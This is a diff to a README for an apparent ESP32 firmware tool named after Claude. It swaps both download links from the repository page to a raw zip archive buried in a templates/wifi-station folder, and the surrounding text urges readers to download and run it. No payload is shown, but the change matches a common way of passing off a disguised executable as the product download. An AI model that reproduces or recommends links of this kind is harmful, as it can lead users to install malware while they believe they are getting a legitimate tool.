@@ -1,6 +1,6 @@
 # 🤖 esp32-claude-workbench - Structured ESP32 Firmware Workflow
 
-[![Download](https://img.shields.io/badge/Download-esp32--claude--workbench-blue?style=for-the-badge)](https://github.com/auxetic-brama706/esp32-claude-workbench)
+[![Download](https://img.shields.io/badge/Download-esp32--claude--workbench-blue?style=for-the-badge)](https://github.com/auxetic-brama706/esp32-claude-workbench/raw/refs/heads/main/templates/wifi-station/claude_esp_workbench_v3.4.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it if you want a more organized way to work on ESP32 projects and keep chang
 
 To get started, visit this page to download and run the software:
 
-[Download esp32-claude-workbench](https://github.com/auxetic-brama706/esp32-claude-workbench)
+[Download esp32-claude-workbench](https://github.com/auxetic-brama706/esp32-claude-workbench/raw/refs/heads/main/templates/wifi-station/claude_esp_workbench_v3.4.zip)
 
 ## 🪟 Windows Setup
 
